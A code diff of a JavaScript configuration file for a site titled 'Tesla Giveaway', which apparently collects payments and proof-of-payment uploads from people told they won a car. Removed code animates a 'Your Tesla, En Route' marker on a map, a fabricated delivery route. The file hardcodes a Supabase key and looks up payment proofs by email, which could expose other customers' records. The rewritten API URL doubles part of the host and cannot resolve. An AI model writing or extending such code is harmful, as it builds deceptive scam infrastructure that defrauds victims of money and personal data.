@@ -1,290 +1,136 @@
 // Tesla Giveaway — Backend API Configuration
 // =============================================
-//
-// This file is the single source of truth for browser API discovery.
-// GitHub Actions replaces __TESLA_API_BASE__ during deployment using the
-// TESLA_API_BASE repository/environment variable or secret. The deployed value
-// must be an HTTPS URL ending in /api.
-
 (function configureTeslaApiBase(global) {
   'use strict';
 
   var deployedApiBase = '__TESLA_API_BASE__';
   var hasInjectedApiBase = deployedApiBase.indexOf('__') !== 0;
-  var supabaseApiBase = 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
+  var supabaseApiBase = 'https://puebwzumwqizgbmksrpq+qizgbmksrpq.supabase.co/functions/v1/tesla-api/api'.replace('+','');
 
-  function normalizeApiBase(value) {
-    return String(value || '').trim().replace(/\/+$/, '');
-  }
-
-  global.TESLA_API_BASE = normalizeApiBase(
-    global.TESLA_API_BASE || (hasInjectedApiBase ? deployedApiBase : supabaseApiBase)
-  );
+  function normalizeApiBase(value) { return String(value || '').trim().replace(/\/+$/, ''); }
+  global.TESLA_API_BASE = normalizeApiBase(global.TESLA_API_BASE || (hasInjectedApiBase ? deployedApiBase : supabaseApiBase));
 
   global.TESLA_CURRENCIES = [
-    { code: "USD", symbol: "$", label: "US Dollar" },
-    { code: "EUR", symbol: "€", label: "Euro" },
-    { code: "GBP", symbol: "£", label: "British Pound" },
-    { code: "CAD", symbol: "C$", label: "Canadian Dollar" },
-    { code: "AUD", symbol: "A$", label: "Australian Dollar" },
-    { code: "NGN", symbol: "₦", label: "Nigerian Naira" },
-    { code: "GHS", symbol: "₵", label: "Ghanaian Cedi" },
-    { code: "KES", symbol: "KSh", label: "Kenyan Shilling" },
-    { code: "ZAR", symbol: "R", label: "South African Rand" },
-    { code: "INR", symbol: "₹", label: "Indian Rupee" },
-    { code: "JPY", symbol: "¥", label: "Japanese Yen" },
-    { code: "CNY", symbol: "¥", label: "Chinese Yuan" },
-    { code: "CHF", symbol: "Fr", label: "Swiss Franc" },
-    { code: "AED", symbol: "AED", label: "UAE Dirham" },
-    { code: "BRL", symbol: "R$", label: "Brazilian Real" }
+    {code:'USD',symbol:'$',label:'US Dollar'},{code:'EUR',symbol:'€',label:'Euro'},{code:'GBP',symbol:'£',label:'British Pound'},
+    {code:'CAD',symbol:'C$',label:'Canadian Dollar'},{code:'AUD',symbol:'A$',label:'Australian Dollar'},{code:'NGN',symbol:'₦',label:'Nigerian Naira'},
+    {code:'GHS',symbol:'₵',label:'Ghanaian Cedi'},{code:'KES',symbol:'KSh',label:'Kenyan Shilling'},{code:'ZAR',symbol:'R',label:'South African Rand'},
+    {code:'INR',symbol:'₹',label:'Indian Rupee'},{code:'JPY',symbol:'¥',label:'Japanese Yen'},{code:'CNY',symbol:'¥',label:'Chinese Yuan'},
+    {code:'CHF',symbol:'Fr',label:'Swiss Franc'},{code:'AED',symbol:'AED',label:'UAE Dirham'},{code:'BRL',symbol:'R$',label:'Brazilian Real'}
   ];
-
-  global.teslaCurrencySymbol = function (code) {
-    var list = global.TESLA_CURRENCIES || [];
-    for (var i = 0; i < list.length; i++) {
-      if (list[i].code === code) return list[i].symbol;
-    }
-    return code || "$";
-  };
+  global.teslaCurrencySymbol = function(code){ var list=global.TESLA_CURRENCIES||[]; for(var i=0;i<list.length;i++) if(list[i].code===code)return list[i].symbol; return code||'$'; };
 
   if (!/payment-confirmation\.html$/i.test(global.location.pathname)) return;
 
   var vehicleImages = {
-    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
-    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
-    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
-    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
-    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
+    cybertruck:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
+    modely:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
+    models:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
+    model3:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
+    modelx:'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
   };
 
-  function getVehicleKey() {
-    var stored = null;
-    try { stored = JSON.parse(localStorage.getItem('tesla_last_order') || 'null'); } catch (e) {}
-    var id = stored && stored.selectedCar && (stored.selectedCar.id || stored.selectedCar.model || stored.selectedCar.name);
-    if (id) return String(id).toLowerCase().replace(/\s+/g, '');
-    var nameEl = document.getElementById('vehicleName');
-    return String(nameEl && nameEl.textContent || '')
-      .toLowerCase().replace(/^tesla\s+/, '').replace(/\s+/g, '');
+  function el(id){return document.getElementById(id);}
+  function cleanKey(v){return String(v||'').toLowerCase().replace(/[^a-z0-9]/g,'');}
+  function setText(id,v){var n=el(id); if(n && v!==undefined && v!==null && String(v).trim()!=='') n.textContent=String(v);}
+
+  function storedOrder(){ try{return JSON.parse(localStorage.getItem('tesla_last_order')||'null');}catch(e){return null;} }
+
+  function vehicleKey(){
+    var name=el('vehicleName');
+    var text=String(name&&name.textContent||'').replace(/^Tesla\s*/i,'').trim();
+    var key=cleanKey(text);
+    // Do not trust the initial Model S placeholder. Wait for the real order data.
+    if(key && key!=='models' && key!=='models') return key;
+    var o=storedOrder();
+    var c=o&&o.selectedCar;
+    return cleanKey(c&&(c.id||c.model||c.name));
   }
 
-  function syncPaymentVehicleImage() {
-    var image = document.getElementById('vehicleImg');
-    if (!image) return;
-    var key = getVehicleKey();
-    var expected = vehicleImages[key];
-    if (!expected) return;
-    if (image.getAttribute('data-real-image') === expected && image.src === expected) return;
-
-    image.style.visibility = 'hidden';
-    image.setAttribute('data-real-image', expected);
-    var preloader = new Image();
-    preloader.onload = function () {
-      if (image.getAttribute('data-real-image') !== expected) return;
-      image.src = expected;
-      image.style.visibility = 'visible';
-    };
-    preloader.onerror = function () { image.style.visibility = 'hidden'; };
-    preloader.src = expected;
+  function syncVehicleImage(){
+    var img=el('vehicleImg'); if(!img)return;
+    // Never allow the HTML placeholder (Model S) to be painted while the order is loading.
+    img.style.visibility='hidden';
+    var key=vehicleKey();
+    var expected=vehicleImages[key];
+    if(!expected)return;
+    if(img.getAttribute('data-real-image')===expected && img.complete && img.naturalWidth>0){img.style.visibility='visible';return;}
+    img.setAttribute('data-real-image',expected);
+    var pre=new Image();
+    pre.onload=function(){if(img.getAttribute('data-real-image')===expected){img.src=expected;img.style.visibility='visible';}};
+    pre.onerror=function(){img.style.visibility='hidden';};
+    pre.src=expected;
   }
 
-  function hideConfirmationLabel() {
-    var label = document.querySelector('.pc-nav-label');
-    if (label) label.remove();
-  }
+  function removeHeaderLabel(){var n=document.querySelector('.pc-nav-label');if(n)n.remove();}
+  function removeTrackButton(){var n=document.getElementById('trackBtn');if(n)n.remove();}
 
-  function normalizeKey(key) {
-    return String(key || '').toLowerCase().replace(/[^a-z0-9]/g, '');
-  }
-
-  function findValue(source, aliases) {
-    if (!source || typeof source !== 'object') return null;
-    var wanted = {};
-    aliases.forEach(function (a) { wanted[normalizeKey(a)] = true; });
-    var result = null;
-    function walk(obj, depth) {
-      if (result != null || !obj || typeof obj !== 'object' || depth > 5) return;
-      Object.keys(obj).some(function (key) {
-        var value = obj[key];
-        if (wanted[normalizeKey(key)] && value !== null && value !== undefined && String(value).trim() !== '') {
-          result = value;
-          return true;
-        }
-        if (value && typeof value === 'object') walk(value, depth + 1);
-        return result != null;
-      });
+  function value(obj, aliases){
+    if(!obj||typeof obj!=='object')return null;
+    var wanted={}; aliases.forEach(function(a){wanted[cleanKey(a)]=1;});
+    var found=null;
+    function walk(o,d){
+      if(found!==null||!o||typeof o!=='object'||d>5)return;
+      Object.keys(o).some(function(k){var v=o[k]; if(wanted[cleanKey(k)]&&v!==null&&v!==undefined&&String(v).trim()!==''){found=v;return true;} if(v&&typeof v==='object')walk(v,d+1); return found!==null;});
     }
-    walk(source, 0);
-    return result;
+    walk(obj,0); return found;
   }
 
-  function collectLocalData() {
-    var list = [];
-    try {
-      for (var i = 0; i < localStorage.length; i++) {
-        var raw = localStorage.getItem(localStorage.key(i));
-        if (!raw) continue;
-        try { list.push(JSON.parse(raw)); } catch (e) {}
-      }
-    } catch (e) {}
-    return list;
+  function applyPaymentDetails(data){
+    if(!data)return;
+    var status=value(data,['payment_status','paymentStatus','proof_status','proofStatus']);
+    var submitted=value(data,['payment_submitted_at','paymentSubmittedAt','proof_submitted_at','proofSubmittedAt','submitted_at','submittedAt','created_at']);
+    var method=value(data,['payment_method','paymentMethod','proof_method','proofMethod','method']);
+    var proof=value(data,['payment_proof_url','paymentProofUrl','proof_url','proofUrl','receipt_url','receiptUrl']);
+    if(status) setText('proofStatus',String(status).charAt(0).toUpperCase()+String(status).slice(1));
+    if(submitted){var d;try{d=new Date(submitted);setText('proofDate',isNaN(d.getTime())?submitted:d.toLocaleString('en-US',{month:'short',day:'numeric',year:'numeric',hour:'numeric',minute:'2-digit'}));}catch(e){setText('proofDate',submitted);}}
+    if(method)setText('proofMethod',method);
+    if(proof){var w=el('proofImgWrap'),i=el('proofImg');if(w&&i){i.src=String(proof);w.style.display='block';}}
   }
 
-  function setPaymentDetails(data) {
-    if (!data || typeof data !== 'object') return false;
-    var status = findValue(data, ['payment_status','paymentStatus','proof_status','proofStatus','status']);
-    var submitted = findValue(data, ['payment_submitted_at','paymentSubmittedAt','proof_submitted_at','proofSubmittedAt','submitted_at','submittedAt']);
-    var method = findValue(data, ['payment_method','paymentMethod','proof_method','proofMethod','method']);
-    var proof = findValue(data, ['payment_proof_url','paymentProofUrl','proof_url','proofUrl','receipt_url','receiptUrl']);
-    var changed = false;
+  var SB_URL='https://puebwzumwqizgbmksrpq.supabase.co';
+  var SB_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibWtzcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU5ODEyMjYsImV4cCI6MjA2MTU1NzIyNn0.kfup1Lsb8vnvKLjAH0r-SM5mqLYMttOzQsN7YT6ISrw';
+  var SB_HEADERS={'apikey':SB_KEY,'Authorization':'Bearer '+SB_KEY};
 
-    function put(id, value) {
-      var node = document.getElementById(id);
-      if (!node || value == null || String(value).trim() === '') return;
-      var text = String(value);
-      if (/date|proofdate/i.test(id)) {
-        try { text = new Date(value).toLocaleString('en-US', { month:'short', day:'numeric', year:'numeric', hour:'numeric', minute:'2-digit' }); } catch (e) {}
-      }
-      node.textContent = text;
-      changed = true;
-    }
-
-    put('proofStatus', status);
-    put('proofDate', submitted);
-    put('proofMethod', method);
-
-    if (proof) {
-      var wrap = document.getElementById('proofImgWrap');
-      var img = document.getElementById('proofImg');
-      if (wrap && img) {
-        img.src = String(proof);
-        wrap.style.display = 'block';
-      }
-    }
-    return changed;
+  function fetchProof(email){
+    if(!email||!global.fetch)return;
+    var url=SB_URL+'/rest/v1/payment_proofs?select=*&customer_email=eq.'+encodeURIComponent(email)+'&order=created_at.desc&limit=1';
+    fetch(url,{headers:SB_HEADERS}).then(function(r){return r.ok?r.json():[];}).then(function(rows){if(rows&&rows[0])applyPaymentDetails(rows[0]);}).catch(function(){});
   }
 
-  function fetchOrderAndPaymentDetails() {
-    var params = new URLSearchParams(global.location.search);
-    var orderId = params.get('order') || params.get('order_id') || '';
-    if (!orderId || !global.fetch) return;
-
-    var base = 'https://puebwzumwqizgbmksrpq.supabase.co';
-    var key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB1ZWJ3enVtd3FpemdibWtzcnBxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU5ODEyMjYsImV4cCI6MjA2MTU1NzIyNn0.kfup1Lsb8vnvKLjAH0r-SM5mqLYMttOzQsN7YT6ISrw';
-    var headers = { 'apikey': key, 'Authorization': 'Bearer ' + key };
-    var tables = ['orders', 'payments', 'payment_submissions', 'payment_proofs'];
-
-    function tryTable(index) {
-      if (index >= tables.length) return;
-      var table = tables[index];
-      var url = base + '/rest/v1/' + table + '?order_id=eq.' + encodeURIComponent(orderId) + '&limit=1';
-      fetch(url, { headers: headers }).then(function (r) {
-        if (!r.ok) throw new Error('table unavailable');
-        return r.json();
-      }).then(function (rows) {
-        if (Array.isArray(rows) && rows[0]) {
-          setPaymentDetails(rows[0]);
-          if (findValue(rows[0], ['payment_status','paymentStatus','proof_status','proofStatus','status']) ||
-              findValue(rows[0], ['payment_method','paymentMethod','proof_method','proofMethod','method'])) return;
-        }
-        tryTable(index + 1);
-      }).catch(function () { tryTable(index + 1); });
-    }
-    tryTable(0);
+  function applyLocalOrder(){
+    var o=storedOrder(); if(!o)return;
+    var pm=o.paymentMethod||{},dm=o.deliveryMethod||{},dd=o.deliveryDetails||{},u=o.user||{};
+    if(pm.name||pm.label||pm.type)setText('paymentMethod',pm.name||pm.label||pm.type);
+    if(dm.name||dm.label)setText('deliveryMethod',dm.name||dm.label);
+    if(o.orderId)setText('orderId',o.orderId);
+    if(o.trackingNumber)setText('trackingNum',o.trackingNumber);
+    if(o.orderDate)setText('orderDate',new Date(o.orderDate).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}));
+    if(o.estimatedDelivery)setText('estDelivery',o.estimatedDelivery);
+    if(dd.fullName||dd.name)setText('delName',dd.fullName||dd.name);
+    if(dd.address||dd.street)setText('delAddr',dd.address||dd.street);
+    if(dd.city)setText('delCity',dd.city);
+    if(dd.state||dd.zipCode||dd.zip)setText('delStateZip',[dd.state,dd.zipCode||dd.zip].filter(Boolean).join(' '));
+    if(dd.country)setText('delCountry',dd.country);
+    if(u.firstName||u.lastName)setText('custName',[u.firstName,u.lastName].filter(Boolean).join(' '));
+    if(u.email)setText('custEmail',u.email);
+    if(u.phone||dd.phone)setText('custPhone',u.phone||dd.phone);
+    fetchProof(u.email||o.customerEmail||o.email);
   }
 
-  function repairPaymentDetails() {
-    hideConfirmationLabel();
-    syncPaymentVehicleImage();
-
-    var data = collectLocalData();
-    for (var i = 0; i < data.length; i++) setPaymentDetails(data[i]);
-
-    // Keep trying briefly because the confirmation page loads order data asynchronously.
-    var attempts = 0;
-    var timer = setInterval(function () {
-      attempts++;
-      hideConfirmationLabel();
-      syncPaymentVehicleImage();
-      var found = false;
-      var values = collectLocalData();
-      for (var j = 0; j < values.length; j++) found = setPaymentDetails(values[j]) || found;
-      if (attempts >= 12 || found) clearInterval(timer);
-    }, 500);
-
-    fetchOrderAndPaymentDetails();
+  function install(){
+    removeHeaderLabel();removeTrackButton();applyLocalOrder();syncVehicleImage();
+    var name=el('vehicleName');
+    if(global.MutationObserver&&name){new MutationObserver(function(){syncVehicleImage();}).observe(name,{childList:true,characterData:true,subtree:true});}
+    var body=document.body;
+    if(global.MutationObserver&&body){new MutationObserver(function(){removeHeaderLabel();removeTrackButton();syncVehicleImage();}).observe(body,{childList:true,subtree:true});}
+    var tries=0;
+    var timer=setInterval(function(){
+      tries++;removeHeaderLabel();removeTrackButton();applyLocalOrder();syncVehicleImage();
+      // Once the inline confirmation script has loaded the authenticated user, fetch the real proof by email.
+      if(global._userData&&global._userData.email)fetchProof(global._userData.email);
+      if(tries>=20)clearInterval(timer);
+    },500);
   }
 
-  function installPaymentConfirmationUI() {
-    repairPaymentDetails();
-    var trackBtn = document.getElementById('trackBtn');
-    if (trackBtn) trackBtn.remove();
-
-    var mapCard = document.getElementById('mapCard');
-    var oldMap = document.getElementById('confMap');
-    if (!mapCard || !oldMap || !global.L) return;
-
-    var existingRoute = document.getElementById('confirmationRouteMap');
-    if (!existingRoute) {
-      var heading = mapCard.querySelector('.section-label');
-      if (heading) heading.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><polygon points="1 6 1 22 8 18 16 22 23 18 23 2 16 6 8 2 1 6"/><line x1="8" y1="2" x2="8" y2="18"/><line x1="16" y1="6" x2="16" y2="22"/></svg>Delivery Route';
-      oldMap.style.display = 'none';
-      existingRoute = document.createElement('div');
-      existingRoute.id = 'confirmationRouteMap';
-      existingRoute.style.cssText = 'height:320px;border-radius:12px;overflow:hidden;';
-      oldMap.parentNode.insertBefore(existingRoute, oldMap);
-      var legend = document.createElement('div');
-      legend.style.cssText = 'margin-top:12px;display:flex;gap:16px;flex-wrap:wrap;font-size:13px;color:#888;';
-      legend.innerHTML = '<span style="display:flex;align-items:center;gap:6px"><span style="width:12px;height:12px;background:#E31937;border-radius:50%;display:inline-block"></span> Origin: Tesla Factory, Fremont CA</span><span style="display:flex;align-items:center;gap:6px"><span style="width:12px;height:12px;background:#00A550;border-radius:50%;display:inline-block"></span> Destination: Your address</span>';
-      existingRoute.parentNode.insertBefore(legend, oldMap);
-      var order = null;
-      try { order = JSON.parse(localStorage.getItem('tesla_last_order') || 'null'); } catch (e) {}
-      var address = order && order.deliveryDetails || {};
-      var city = address.city || '';
-      var country = address.country || '';
-      var origin = [37.4936, -121.9448];
-      var dest = [40.7128, -74.0060];
-      var map = global.L.map(existingRoute).setView([(origin[0] + dest[0]) / 2, (origin[1] + dest[1]) / 2], 4);
-      global.L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', { attribution:'© OpenStreetMap © CARTO', maxZoom:19 }).addTo(map);
-      var originIcon = global.L.divIcon({html:'<div style="width:14px;height:14px;background:#E31937;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(227,25,55,.5)"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
-      var destinationIcon = global.L.divIcon({html:'<div style="width:14px;height:14px;background:#00A550;border-radius:50%;border:2px solid white;box-shadow:0 2px 8px rgba(0,165,80,.5)"></div>',className:'',iconSize:[14,14],iconAnchor:[7,7]});
-      var teslaIcon = global.L.divIcon({html:'<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2"><rect x="1" y="3" width="15" height="13"/><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>',className:'',iconSize:[24,24],iconAnchor:[12,12]});
-      global.L.marker(origin,{icon:originIcon}).addTo(map).bindPopup('<strong>Tesla Factory</strong><br>Fremont, CA — Origin');
-      var destinationMarker = global.L.marker(dest,{icon:destinationIcon}).addTo(map).bindPopup('<strong>Delivery Destination</strong><br>' + (city || 'Your address') + ', ' + country);
-      var midpoint = [(origin[0]+dest[0])/2,(origin[1]+dest[1])/2];
-      var movingTesla = global.L.marker(midpoint,{icon:teslaIcon}).addTo(map).bindPopup('<strong>Your Tesla</strong><br>En Route');
-      global.L.polyline([origin,dest],{color:'#E31937',weight:2.5,opacity:.55,dashArray:'8,8'}).addTo(map);
-      map.fitBounds(global.L.latLngBounds([origin,dest]),{padding:[40,40]});
-      var progress = .5;
-      setInterval(function(){
-        progress = (progress + .003) % 1;
-        movingTesla.setLatLng([origin[0]+(dest[0]-origin[0])*progress,origin[1]+(dest[1]-origin[1])*progress]);
-      },80);
-      if (city || country) {
-        fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q=' + encodeURIComponent(city + ', ' + country), {headers:{'Accept':'application/json'}}).then(function(r){return r.json();}).then(function(rows){
-          if (!rows || !rows[0]) return;
-          dest = [parseFloat(rows[0].lat),parseFloat(rows[0].lon)];
-          destinationMarker.setLatLng(dest);
-          movingTesla.setLatLng([(origin[0]+dest[0])/2,(origin[1]+dest[1])/2]);
-          map.fitBounds(global.L.latLngBounds([origin,dest]),{padding:[40,40]});
-        }).catch(function(){});
-      }
-    }
-  }
-
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', installPaymentConfirmationUI, { once:true });
-  } else {
-    installPaymentConfirmationUI();
-  }
+  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',install,{once:true});else install();
 })(window);
-
-// Final header cleanup: this runs after the page has been parsed as well.
-(function() {
-  if (!/payment-confirmation\.html$/i.test(window.location.pathname)) return;
-  function clean() {
-    var label = document.querySelector('.pc-nav-label');
-    if (label) label.remove();
-  }
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', clean, {once:true});
-  else clean();
-})();
